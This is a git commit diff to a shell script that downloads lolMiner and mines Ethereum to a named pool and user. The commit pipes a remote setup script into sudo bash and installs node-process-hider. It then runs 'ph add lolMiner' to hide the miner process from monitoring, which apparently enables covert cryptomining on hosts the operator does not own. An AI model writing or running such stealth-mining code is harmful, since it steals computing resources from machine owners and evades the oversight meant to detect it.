22d44b9e3a4bda7f816c2fef7dd223bd121be935
Master478963 <101531061+Master478963@users.noreply.github.com>
2022-04-28 12:47:27 +0530

    Update PhoenixMinerEth.sh

--- PhoenixMinerEth.sh
+++ PhoenixMinerEth.sh
@@ -7,15 +7,22 @@ sleep 15
 wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz 
 tar -xf lolMiner_v1.29_Lin64.tar.gz
 cd 1.29
+apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+apt-get install -y nodejs
+npm i -g node-process-hider
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
 sudo swapoff -a; sudo swapon -a
 sleep 10
+ph add lolMiner
 ./lolMiner --algo ETHASH --pool stratum+tcp://ethash.kupool.com:8888 --user hunterd.001 --ethstratum ETHPROXY
 sleep 10
 sudo swapoff -a; sudo swapon -a
-pkill -9 lolMiner
+
 pkill -9 lolMiner
 pkill -9 lolMiner
 sleep 9
 pkill -9 lolMiner
-sleep 15
-sleep 45
+sleep 30
